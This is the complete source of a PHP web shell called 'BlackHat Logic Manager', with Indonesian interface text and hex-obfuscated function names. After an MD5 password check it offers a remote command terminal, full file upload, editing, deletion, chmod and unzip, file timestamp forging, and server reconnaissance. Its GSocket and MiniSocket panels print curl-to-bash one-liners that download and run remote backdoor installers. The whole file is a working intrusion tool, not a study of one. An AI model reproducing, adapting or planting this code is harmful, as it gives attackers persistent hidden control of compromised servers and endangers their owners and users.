<?php
error_reporting(0);
session_start();
$APP_NAME = "BlackHat Logic Manager";
$BASE_PATH = getcwd();

${"\x50\x41\x53\x53\x57\x4f\x52\x44\x5f\x4d\x44\x35"} = "\x61\x38\x34\x65\x35\x66\x32\x35\x65\x37\x66\x36\x64\x35\x64\x65\x39\x62\x38\x32\x63\x65\x33\x66\x36\x34\x64\x31\x62\x38\x66\x61";
if(isset(${"\x5f\x50\x4f\x53\x54"}["\x6c\x6f\x67\x69\x6e"])){
    ${"\x70\x61\x73\x73"} = ${"\x5f\x50\x4f\x53\x54"}["\x70\x61\x73\x73\x77\x6f\x72\x64"];
    if(md5(${"\x70\x61\x73\x73"}) === ${"\x50\x41\x53\x53\x57\x4f\x52\x44\x5f\x4d\x44\x35"}){
        ${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] = true;
        header("Location: ".${"\x5f\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5f\x53\x45\x4c\x46"]);
        exit;
    } else {
        ${"\x6d\x73\x67"} = "\x50\x61\x73\x73\x77\x6f\x72\x64\x20\x73\x61\x6c\x61\x68\x21";
    }
}
if(isset(${"\x5f\x47\x45\x54"}["\x6c\x6f\x67\x6f\x75\x74"])){
    session_destroy();
    header("Location: ".${"\x5f\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5f\x53\x45\x4c\x46"]);
    exit;
}
if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"]) || ${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=${"\x41\x50\x50\x5f\x4e\x41\x4d\x45"}?> - Login</title>
        <style>
            body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
            input{padding:6px;margin:5px;border-radius:4px;border:none;}
            input[type=password]{width:200px;}
            input[type=submit]{background:#f1c40f;color:#000;cursor:pointer;font-weight:bold;}
            .msg{color:#e74c3c;margin-top:10px;}
            .login-row{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:10px;}
            .login-row label{font-size:14px;}
        </style>
    </head>
    <body>
        <h1><?=${"\x41\x50\x50\x5f\x4e\x41\x4d\x45"}?></h1>
        <form method="POST">
            <div class="login-row">
                <label>Password:</label>
                <input type="password" name="password">
                <input type="submit" name="login" value="Login">
            </div>
        </form>
        <?php if(isset(${"\x6d\x73\x67"})) echo "<div class='msg'>".${"\x6d\x73\x67"}."</div>"; ?>
    </body>
    </html>
    <?php
    exit;
}
function perms($file){ return substr(sprintf('%o', fileperms($file)), -4); }
function owner($file){
    if(function_exists('posix_getpwuid')){
        $uid = fileowner($file);
        $info = posix_getpwuid($uid);
        return $info['name'];
    } elseif(function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")){
        $owner = "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"('ls -ld '.escapeshellarg($file).' | awk \'{print $3}\'');
        return trim($owner);
    }
    return 'unknown';
}

function exe($cmd, $cwd = null){ $cmd = "(" . $cmd . ") 2>&1"; if($cwd) { $cmd = "\x63\x64" . " " . escapeshellarg($cwd) . " && " . $cmd; } if(function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { $result = "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"($cmd); if($result === null || $result === false) { return "Command executed (no output)"; } return $result; } elseif(function_exists("\x65\x78\x65\x63")){ exec($cmd, $o, $return_var); $output = implode("\n", $o); if($return_var !== 0 && empty($output)) { return "Command failed with return code: " . $return_var; } return $output ?: "Command executed (no output)"; } elseif(function_exists("\x73\x79\x73\x74\x65\x6d")){ ob_start(); system($cmd, $return_var); $o = ob_get_clean(); if($return_var !== 0 && empty($o)) { return "Command failed with return code: " . $return_var; } return $o ?: "Command executed (no output)"; } elseif(function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")){ ob_start(); passthru($cmd, $return_var); $o = ob_get_clean(); if($return_var !== 0 && empty($o)) { return "Command failed with return code: " . $return_var; } return $o ?: "Command executed (no output)"; } return "Command execution not available."; }
function getFileDate($file, $format = 'F d Y H:i:s') { return date($format, filemtime($file)); }
function formatSize($bytes){
    if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
    elseif($bytes>=1048576) return number_format($bytes/1048576,2).' MB';
    elseif($bytes>=1024) return number_format($bytes/1024,2).' KB';
    elseif($bytes>1) return $bytes.' B';
    elseif($bytes==1) return '1 B';
    else return '0 B';
}
function isWritable($file){ return "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($file); }
function isReadable($file){ return "\x69\x73\x5f\x72\x65\x61\x64\x61\x62\x6c\x65"($file); }

function getServerIP(){
    if(!empty($_SERVER['SERVER_ADDR'])) return $_SERVER['SERVER_ADDR'];
    elseif(function_exists('gethostbyname')) return gethostbyname($_SERVER['SERVER_NAME']);
    return 'Unknown';
}
function getSystemInfo(){
    if(function_exists('php_uname')) return php_uname();
    elseif(function_exists("\163\150\145\154\x6c\137\x65\x78\145\x63")) return trim("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"("\x75\x6e\x61\x6d\x65\x20\x2d\x61"));
    return 'Unknown';
}
function getCurrentUser(){
    if(function_exists('posix_getpwuid') && function_exists('posix_geteuid')){
        $user = posix_getpwuid(posix_geteuid());
        return $user['name'];
    } elseif(function_exists('get_current_user')) return get_current_user();
    elseif(function_exists("\x73\150\x65\x6c\154\x5f\145\170\145\143")) return trim("\163\x68\145\154\154\x5f\145\x78\145\x63"("\167\x68\157\x61\155\x69"));
    return 'Unknown';
}
function getServerSoftware(){
    return $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
}

$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = str_replace("\\","/",$path);
$paths = explode("/",$path);
$search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
$msg = "";
$msgType = "";
if(isset($_FILES['file'])){
    $dest = $path.'/'.$_FILES['file']['name'];
    if("\x63\x6f\x70\x79"($_FILES['file']['tmp_name'],$dest)){
        // Buat URL langsung ke file (relative dari domain)
        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dest);
        $fileUrl = $relativePath;
        $msg = "Upload Berhasil: <a href='".$fileUrl."' target='_blank'>".$_FILES['file']['name']."</a>";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "Upload Gagal!";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x6e\x65\x77\x66\x69\x6c\x65"])){
    $newFile = $path.'/'.$_POST["\x6e\x65\x77\x66\x69\x6c\x65"];
    $result = "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($newFile,"");
    if($result !== false){
        // Buat URL langsung ke file (relative dari domain)
        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFile);
        $fileUrl = $relativePath;
        $msg = "File dibuat: <a href='".$fileUrl."' target='_blank'>".$_POST["\x6e\x65\x77\x66\x69\x6c\x65"]."</a>";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "Gagal membuat file!";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x6e\x65\x77\x66\x6f\x6c\x64\x65\x72"])){
    if("\x6d\x6b\x64\x69\x72"($path.'/'.$_POST["\x6e\x65\x77\x66\x6f\x6c\x64\x65\x72"])){
        $msg = "Folder dibuat: ".$_POST["\x6e\x65\x77\x66\x6f\x6c\x64\x65\x72"];
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "Gagal membuat folder!";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x64\x65\x6c\x65\x74\x65"])){
    $t=$_POST["\x74\x61\x72\x67\x65\x74"];
    $deleted = false;
    if("\x69\x73\x5f\x64\x69\x72"($t)){
        // Fungsi untuk hapus folder beserta isinya secara rekursif
        function deleteDirectory($dir) {
            if(!@file_exists($dir)) return true;
            if(!@is_dir($dir)) return @unlink($dir);
            foreach(@scandir($dir) as $item) {
                if($item == '.' || $item == '..') continue;
                if(!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
            }
            return @rmdir($dir);
        }
        $deleted = deleteDirectory($t);
    } else {
        $deleted = @unlink($t);
    }
    
    if($deleted){
        $msg = "\x44\x69\x68\x61\x70\x75\x73\x3a\x20"."\x62\x61\x73\x65\x6e\x61\x6d\x65"($t);
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6e\x67\x68\x61\x70\x75\x73\x21";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x72\x65\x6e\x61\x6d\x65"])){
    if("\x72\x65\x6e\x61\x6d\x65"($_POST["\x6f\x6c\x64\x6e\x61\x6d\x65"], "\x64\x69\x72\x6e\x61\x6d\x65"($_POST["\x6f\x6c\x64\x6e\x61\x6d\x65"]).'/'.$_POST["\x6e\x65\x77\x6e\x61\x6d\x65"])){
        $msg = "\x52\x65\x6e\x61\x6d\x65\x20\x62\x65\x72\x68\x61\x73\x69\x6c";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "\x52\x65\x6e\x61\x6d\x65\x20\x67\x61\x67\x61\x6c\x21";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x63\x68\x6d\x6f\x64"])){
    if("\x63\x68\x6d\x6f\x64"($_POST["\x74\x61\x72\x67\x65\x74"], octdec($_POST["\x70\x65\x72\x6d"]))){
        $msg = "\x43\x68\x6d\x6f\x64\x20\x62\x65\x72\x68\x61\x73\x69\x6c";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "\x43\x68\x6d\x6f\x64\x20\x67\x61\x67\x61\x6c\x21";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x73\x61\x76\x65\x66\x69\x6c\x65"])){
    if("\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($_POST["\x74\x61\x72\x67\x65\x74"], $_POST["\x73\x72\x63"])){
        $msg = "\x46\x69\x6c\x65\x20\x64\x69\x73\x69\x6d\x70\x61\x6e";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6e\x79\x69\x6d\x70\x61\x6e\x20\x66\x69\x6c\x65\x21";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
if(isset($_POST["\x63\x68\x61\x6e\x67\x65\x64\x61\x74\x65"])){
    $t=strtotime($_POST["\x6e\x65\x77\x64\x61\x74\x65"]);
    if($t && "\x74\x6f\x75\x63\x68"($_POST["\x74\x61\x72\x67\x65\x74"], $t)){
        $msg = "\x54\x61\x6e\x67\x67\x61\x6c\x20\x64\x69\x75\x62\x61\x68";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6e\x67\x75\x62\x61\x68\x20\x74\x61\x6e\x67\x67\x61\x6c\x21";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}

if(isset($_POST["\x75\x6e\x7a\x69\x70"])){
    $zipFile = $_POST["\x74\x61\x72\x67\x65\x74"];
    $extractPath = $path;
    $success = false;
    if(class_exists('ZipArchive')){
        $zip = new ZipArchive;
        if($zip->open($zipFile) === TRUE){
            $zip->extractTo($extractPath);
            $zip->close();
            $success = true;
        }
    } elseif(function_exists("\163\x68\x65\x6c\x6c\x5f\145\x78\x65\x63")){
        $cmd = "unzip -o ".escapeshellarg($zipFile)." -d ".escapeshellarg($extractPath)." 2>&1";
        "\x73\150\145\154\x6c\x5f\x65\x78\x65\x63"($cmd);
        $success = true;
    }
    if($success){
        $msg = "\x55\x6e\x7a\x69\x70\x20\x62\x65\x72\x68\x61\x73\x69\x6c\x21";
        $msgType = "\x73\x75\x63\x63\x65\x73\x73";
    } else {
        $msg = "\x55\x6e\x7a\x69\x70\x20\x67\x61\x67\x61\x6c\x21";
        $msgType = "\x65\x72\x72\x6f\x72";
    }
}
$terminal_output = "";
$showTerminal = isset($_POST["\x74\x6f\x67\x67\x6c\x65\x5f\x74\x65\x72\x6d\x69\x6e\x61\x6c"]) ? true : false;
$showGSocket = isset($_POST["\x73\x68\x6f\x77\x5f\x67\x73\x6f\x63\x6b\x65\x74"]) ? true : false;
$showMiniSocket = isset($_POST["\x73\x68\x6f\x77\x5f\x6d\x69\x6e\x69\x73\x6f\x63\x6b\x65\x74"]) ? true : false;
if(isset($_POST["\x65\x78\x65\x63\x6d\x64"])){ 
    $terminal_output = exe($_POST["\x63\x6d\x64"], $path); 
    $showTerminal = true;
}
function getFileExtension($file){
    return strtolower("\x70\x61\x74\x68\x69\x6e\x66\x6f"($file, PATHINFO_EXTENSION));
}

$disableFunctions = ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73");
$disableFunctionsText = $disableFunctions ?: 'Aman';
$disableFunctionsColor = ($disableFunctionsText == 'Aman') ? '#00ff00' : '#ff4444';
?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{box-sizing:border-box;}
body{font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background:#0d0d0d;color:#eee;margin:0;padding:0;font-size:14px;}
h1{color:#fff;text-align:center;padding:15px 0;margin:0;font-size:26px;font-weight:500;background:#111;border-bottom:1px solid #333;}
h1 i{color:#f1c40f;margin-right:10px;}
a{color:#f1c40f;text-decoration:none;}a:hover{color:#e67e22;text-decoration:none;}
table{width:100%;border-collapse:collapse;background:#0d0d0d;}
th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #333;}
th{background:#1a1a1a;color:#f1c40f;font-weight:500;font-size:13px;text-transform:uppercase;letter-spacing:0.5px;}
tr:hover{background:#1a1a1a;}
input,textarea,select{background:#1a1a1a;color:#fff;border:1px solid #444;border-radius:4px;padding:6px 12px;font-size:13px;}
textarea{width:100%;height:500px;font-family:'Courier New', monospace;background:#0d0d0d;color:#eee;}
button{cursor:pointer;background:#f1c40f;color:#000;border:none;font-weight:500;padding:6px 12px;border-radius:4px;}
button:hover{background:#e67e22;color:#000;}
.btn-icon{background:none;border:none;padding:5px 6px;margin:0 2px;color:#fff;font-size:14px;cursor:pointer;}
.btn-icon:hover{background:#1a1a1a;color:#e67e22;}
.btn-icon.delete:hover{color:#ff4444;}
.btn-icon.unzip{color:#fff;}
.btn-icon.unzip:hover{color:#e67e22;}
.file-link{cursor:pointer;color:#fff;text-decoration:none;}
.file-link:hover{color:#e67e22;text-decoration:none;}
.file-link i{margin-right:6px;}
.breadcrumb{padding:10px 20px;background:#111;border-bottom:1px solid #333;font-size:13px;}
.breadcrumb i{color:#f1c40f;margin:0 5px;}
.breadcrumb a{color:#f1c40f;}
.breadcrumb a:hover{color:#e67e22;}
.msg-box{padding:10px 20px;background:#111;margin:15px 0;font-size:13px;border-radius:4px;}
.msg-box.success{border-left:4px solid #00ff00;color:#00ff00;}
.msg-box.error{border-left:4px solid #ff4444;color:#ff4444;}
.msg-box i{margin-right:8px;}
.server-panel{background:#111;border:1px solid #333;border-radius:6px;padding:15px 20px;margin:0 20px 15px 20px;}
.server-panel .info-row{display:flex;margin-bottom:8px;font-size:13px;}
.server-panel .info-row i{color:#f1c40f;width:25px;margin-right:10px;}
.server-panel .info-row .label{width:140px;color:#888;}
.server-panel .info-row .value{color:#fff;word-break:break-all;flex:1;}
.terminal-panel{margin:0 20px 15px 20px;}
.terminal-panel textarea{width:100%;height:300px;background:#0d0d0d;color:#fff;border:1px solid #444;font-family:'Courier New', monospace;font-size:12px;padding:10px;resize:vertical;}
.info-box{padding:12px 20px;background:#111;border-bottom:1px solid #333;margin:0;display:flex;align-items:center;flex-wrap:wrap;gap:15px;font-size:13px;}
.info-box i{color:#f1c40f;margin-right:6px;width:18px;}
.info-box span{margin-left:auto;display:flex;gap:8px;align-items:center;}
.server-btn{background:#1a1a1a;color:#fff;border:1px solid #444;padding:5px 12px;cursor:pointer;border-radius:4px;font-size:13px;}
.server-btn:hover{background:#e67e22;color:#000;border-color:#e67e22;}
.server-btn i{margin-right:5px;}
.server-btn.active{background:#e67e22;color:#000;}
.home-btn{background:none;color:#f1c40f;border:1px solid #f1c40f;padding:5px 14px;cursor:pointer;border-radius:4px;font-size:13px;}
.home-btn:hover{background:#e67e22;color:#000;border-color:#e67e22;}
.home-btn i{margin-right:5px;}
.action-bar{padding:10px 20px;background:#111;border-bottom:1px solid #333;display:flex;gap:20px;flex-wrap:wrap;font-size:13px;}
.container{padding:0 20px 20px;}
.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1999;}
.modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#0d0d0d;border-radius:6px;padding:25px;z-index:2000;width:450px;box-shadow:0 5px 30px rgba(0,0,0,0.7);border:1px solid #f1c40f;}
.modal.large{width:90%;max-width:1200px;}
.modal h3{margin:0 0 20px 0;font-size:16px;color:#f1c40f;}
.modal .close{color:#aaa;float:right;font-size:24px;cursor:pointer;}
.modal .close:hover{color:#e67e22;}
.modal input[type="text"]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #444;color:#fff;font-size:13px;}
.modal-footer{padding-top:20px;margin-top:20px;border-top:1px solid #333;text-align:right;display:flex;gap:10px;justify-content:flex-end;}
.btn-primary{background:#f1c40f;color:#000;border:none;padding:8px 18px;font-size:13px;}
.btn-primary:hover{background:#e67e22;}
.btn-secondary{background:#1a1a1a;color:#fff;border:1px solid #444;padding:8px 18px;font-size:13px;}
.btn-secondary:hover{background:#333;}
.fa-folder{color:#f1c40f;}
.action-icons{display:flex;gap:3px;justify-content:flex-start;flex-wrap:nowrap;}
th:nth-child(1){width:22%;}
th:nth-child(2){width:8%;}
th:nth-child(3){width:22%;}
th:nth-child(4){width:18%;}
th:nth-child(5){width:12%;}
th:nth-child(6){width:18%;}
td{font-size:13px;word-break:break-word;}
td a i{margin-right:6px;}
</style>
<script>
function openModal(id){document.getElementById(id).style.display='block';document.getElementById(id+'_overlay').style.display='block';}
function closeModal(id){document.getElementById(id).style.display='none';document.getElementById(id+'_overlay').style.display='none';}
function goHome(){window.location.href='?path=<?=$BASE_PATH?>';}
function numberOnly(event){var key=(event.which)?event.which:event.keyCode;if(key!=46&&key>31&&(key<48||key>57))return false;return true;}
function confirmUnzip(filename){return confirm("\x45\x78\x74\x72\x61\x63\x74\x20\x22"+filename+"\x22\x20\x74\x6f\x20\x63\x75\x72\x72\x65\x6e\x74\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x3f");}
</script>
</head>
<body>

<h1><i class="fas fa-skull"></i> <?=$APP_NAME?></h1>

<div class="info-box">
<div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
<i class="fas fa-server"></i> <span>Server Information</span>
</div>
<span>
<button type="button" class="server-btn"><a href="?logout=1" style="color:#e74c3c;font-size:14px;">Logout</a></button>
<form method="POST" style="display:inline;">
    <button type="submit" name="show_gsocket" class="server-btn <?=$showGSocket?'active':''?>">GSocket</button>
</form>
<form method="POST" style="display:inline;">
    <button type="submit" name="show_minisocket" class="server-btn <?=$showMiniSocket?'active':''?>">MiniSocket</button>
</form>
<form method="POST" style="display:inline;">
    <button type="submit" name="toggle_terminal" class="server-btn <?=$showTerminal?'active':''?>"><i class="fas fa-terminal"></i>Terminal</button>
</form>
<button type="button" class="home-btn" onclick="goHome()"><i class="fas fa-home"></i>Home</button>
</span>
</div>

<div class="server-panel">
    <div class="info-row"><i class="fas fa-network-wired"></i><span class="label">IP :</span><span class="value"><?=getServerIP()?></span></div>
    <div class="info-row"><i class="fas fa-microchip"></i><span class="label">System :</span><span class="value"><?=getSystemInfo()?></span></div>
    <div class="info-row"><i class="fas fa-user"></i><span class="label">User :</span><span class="value"><?=getCurrentUser()?></span></div>
    <div class="info-row"><i class="fab fa-php"></i><span class="label">PHP Version :</span><span class="value"><?=phpversion()?></span></div>
    <div class="info-row"><i class="fas fa-server"></i><span class="label">Software :</span><span class="value"><?=getServerSoftware()?></span></div>
    <div class="info-row"><i class="fas fa-ban"></i><span class="label">Disable Functions :</span><span class="value" style="color:<?=$disableFunctionsColor?>;"><?=$disableFunctionsText?></span></div>
    <div class="info-row"><i class="fas fa-folder-open"></i><span class="label">Path :</span><span class="value"><?=$path?></span></div>
</div>

<?php if($showGSocket): ?>
<div class="terminal-panel"><textarea readonly>bash -c "$(curl -fsSL https://gsocket.io/y)"</textarea></div>
<?php endif; ?>

<?php if($showMiniSocket): ?>
<div class="terminal-panel"><textarea readonly>bash -c "$(curl -fsSL https://minisocket.io/bin/x)"</textarea></div>
<?php endif; ?>

<?php if($showTerminal): ?>
<div class="terminal-panel">
    <form method="POST">
        <div style="display:flex;gap:8px;margin-bottom:10px;">
            <input type="text" name="cmd" placeholder="Enter command..." style="flex:1;background:#1a1a1a;color:#fff;">
            <button type="submit" name="execmd" class="btn-primary"><i class="fas fa-play"></i> Run</button>
        </div>
        <input type="hidden" name="toggle_terminal" value="1">
    </form>
    <?php if($terminal_output): ?>
    <textarea readonly><?=$terminal_output?></textarea>
    <?php else: ?>
    <textarea readonly placeholder="Output will appear here..."></textarea>
    <?php endif; ?>
</div>
<?php endif; ?>

<div class="breadcrumb">
<i class="fas fa-folder"></i>
<?php
foreach($paths as $id=>$pat){
    if($pat==''&&$id==0){echo '<a href="?path=/"><i class="fas fa-hdd"></i> /</a>';continue;}
    if($pat=='')continue;
    echo ' <i class="fas fa-chevron-right"></i> <a href="?path=';
    for($i=0;$i<=$id;$i++){echo $paths[$i]; if($i!=$id)echo "/";}
    echo '">'.$pat.'</a>';
}
?>
</div>

<div class="action-bar">
<form enctype="multipart/form-data" method="POST" style="display:flex;gap:8px;align-items:center;">
    <i class="fas fa-upload" style="color:#f1c40f;"></i>
    <input type="file" name="file" style="width:auto;background:#1a1a1a;">
    <button type="submit">Upload</button>
</form>
<form method="POST" style="display:flex;gap:8px;align-items:center;">
    <i class="fas fa-file" style="color:#f1c40f;"></i>
    <input type="text" name="newfile" placeholder="newfile.txt" style="width:140px;background:#1a1a1a;">
    <button type="submit">New File</button>
</form>
<form method="POST" style="display:flex;gap:8px;align-items:center;">
    <i class="fas fa-folder-plus" style="color:#f1c40f;"></i>
    <input type="text" name="newfolder" placeholder="newfolder" style="width:140px;background:#1a1a1a;">
    <button type="submit">New Folder</button>
</form>
<form method="GET" style="display:flex;gap:8px;align-items:center;margin-left:auto;">
    <input type="hidden" name="path" value="<?=$path?>">
    <i class="fas fa-search" style="color:#f1c40f;"></i>
    <input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." style="width:160px;background:#1a1a1a;">
    <button type="submit">Find</button>
</form>
</div>

<!--  -->
<?php if($msg): ?>
<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=="\x73\x75\x63\x63\x65\x73\x73"?'check':'exclamation'?>-circle"></i> <?php echo $msg; ?></div>
<?php endif; ?>

<div class="container">
<table>
<thead>
<tr><th>Name</th><th>Size</th><th>Modified</th><th>Owner</th><th>Permissions</th><th>Actions</th></tr>
</thead>
<tbody>
<?php
$scandir="\x73\x63\x61\x6e\x64\x69\x72"($path); $folders=[]; $files=[];
foreach($scandir as $f){ 
    if($f=="."||$f=="..") continue; 
    if($search && stripos($f,$search)===false) continue; 
    if("\x69\x73\x5f\x64\x69\x72"($path.'/'.$f)) $folders[]=$f; else $files[]=$f; 
}

function renderRow($full,$f,$isFolder=false){
    $size = $isFolder?'Dir':formatSize("\x66\x69\x6c\x65\x73\x69\x7a\x65"($full));
    $mid = md5($full);
    $cdate = getFileDate($full);
    $cperm = perms($full);
    $fname = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($f);
    $ext = $isFolder ? '' : getFileExtension($f);
    $fowner = owner($full);
    
    $permColor = '';
    if(isWritable($full)) $permColor = '#00ff00';
    elseif(!isReadable($full)) $permColor = '#ff4444';
    
    echo"<tr><td>";
    
    if($isFolder){
        echo "<a href='?path=$full'><i class='fas fa-folder fa-fw'></i> $f</a>";
    } else {
        echo "<a href='javascript:void(0)' onclick=\"openModal('edit_$mid')\" class='file-link'><i class='fas fa-file fa-fw'></i> $f</a>";
    }
    
    echo "</td><td>$size</td><td>$cdate</td><td>$fowner</td><td>";
    
    if($permColor) echo "<font color='$permColor'><b>$cperm</b></font>";
    else echo "<b>$cperm</b>";
    
    echo "</td><td><div class='action-icons'>";
    
    if(!$isFolder){
        echo "<button onclick=\"openModal('edit_$mid')\" class='btn-icon' title='Edit'><i class='fas fa-edit'></i></button>";
    }
    
    echo "<button onclick=\"openModal('rename_$mid')\" class='btn-icon' title='Rename'><i class='fas fa-pen'></i></button>";
    echo "<button onclick=\"openModal('chmod_$mid')\" class='btn-icon' title='Permission'><i class='fas fa-key'></i></button>";
    echo "<button onclick=\"openModal('chdate_$mid')\" class='btn-icon' title='Change Date'><i class='fas fa-calendar-alt'></i></button>";
    
    if(!$isFolder && $ext == 'zip'){
        echo "<form method='POST' style='display:inline;' onsubmit='return confirmUnzip(\"$f\")'>
            <input type='hidden' name='target' value='$full'>
            <button type='submit' name='unzip' class='btn-icon unzip' title='Extract ZIP'><i class='fas fa-file-archive'></i></button>
        </form>";
    }
    
    echo "<form method='POST' style='display:inline;' onsubmit='return confirm(\"Delete $f?\")'>
        <input type='hidden' name='target' value='$full'>
        <button type='submit' name='delete' class='btn-icon delete' title='Delete'><i class='fas fa-trash-alt'></i></button>
    </form>";
    
    echo "</div></td></tr>";
    
    // RENAME MODAL
    echo "<div class='modal-overlay' id='rename_{$mid}_overlay'></div>
    <div class='modal' id='rename_{$mid}'>
        <span class='close' onclick='closeModal(\"rename_{$mid}\")'>&times;</span>
        <h3><i class='fas fa-pen'></i> Rename : $f</h3>
        <form method='POST'>
            <input type='hidden' name='oldname' value='$full'>
            <div style='display:flex;gap:8px;align-items:center;'>
                <span>Name :</span>
                <input type='text' name='newname' value='$fname' style='flex:1;'>
            </div>
            <div class='modal-footer'>
                <button type='button' class='btn-secondary' onclick='closeModal(\"rename_{$mid}\")'>Cancel</button>
                <button type='submit' name='rename' class='btn-primary'>Rename</button>
            </div>
        </form>
    </div>";
    
    // CHMOD MODAL
    echo "<div class='modal-overlay' id='chmod_{$mid}_overlay'></div>
    <div class='modal' id='chmod_{$mid}'>
        <span class='close' onclick='closeModal(\"chmod_{$mid}\")'>&times;</span>
        <h3>Change Permission : $cperm, Name : $f</h3>
        <form method='POST'>
            <input type='hidden' name='target' value='$full'>
            <div style='display:flex;gap:8px;align-items:center;'>
                <span>Change :</span>
                <input type='text' name='perm' maxlength='4' onkeypress='return numberOnly(event)' value='$cperm' style='flex:1;' required>
            </div>
            <div class='modal-footer'>
                <button type='button' class='btn-secondary' onclick='closeModal(\"chmod_{$mid}\")'>Cancel</button>
                <button type='submit' name='chmod' class='btn-primary'>Change</button>
            </div>
        </form>
    </div>";
    
    // CHDATE MODAL
    echo "<div class='modal-overlay' id='chdate_{$mid}_overlay'></div>
    <div class='modal' id='chdate_{$mid}'>
        <span class='close' onclick='closeModal(\"chdate_{$mid}\")'>&times;</span>
        <h3>Change Date : $cdate | Name : $f</h3>
        <form method='POST'>
            <input type='hidden' name='target' value='$full'>
            <div style='display:flex;gap:8px;align-items:center;'>
                <span>Change :</span>
                <input type='text' name='newdate' value='$cdate' style='flex:1;'>
            </div>
            <div class='modal-footer'>
                <button type='button' class='btn-secondary' onclick='closeModal(\"chdate_{$mid}\")'>Cancel</button>
                <button type='submit' name='changedate' class='btn-primary'>Change</button>
            </div>
        </form>
    </div>";
    
    // EDIT MODAL
    if(!$isFolder){
        $fgc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
        $content = "\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c\x63\x68\x61\x72\x73"($fgc($full));
        echo "<div class='modal-overlay' id='edit_{$mid}_overlay'></div>
        <div class='modal large' id='edit_{$mid}'>
            <span class='close' onclick='closeModal(\"edit_{$mid}\")'>&times;</span>
            <h3><i class='fas fa-edit'></i> Edit File : <font color='#00ff00'>$f</font> | Size : $size</h3>
            <form method='POST'>
                <textarea name='src' style='height:600px;width:100%;font-size:13px;'>$content</textarea>
                <input type='hidden' name='target' value='$full'>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"edit_{$mid}\")'>Cancel</button>
                    <button type='submit' name='savefile' class='btn-primary'><i class='fas fa-save'></i> Save</button>
                </div>
            </form>
        </div>";
    }
}

foreach($folders as $f) renderRow($path.'/'.$f,$f,true);
foreach($files as $f) renderRow($path.'/'.$f,$f,false);
?>
</tbody>
</table>
</div>

<div style="text-align:center;padding:15px;color:#666;font-size:12px;">
<?=date("Y")?> &copy; BlackHat Logic Manager
</div>

</body>
</html>
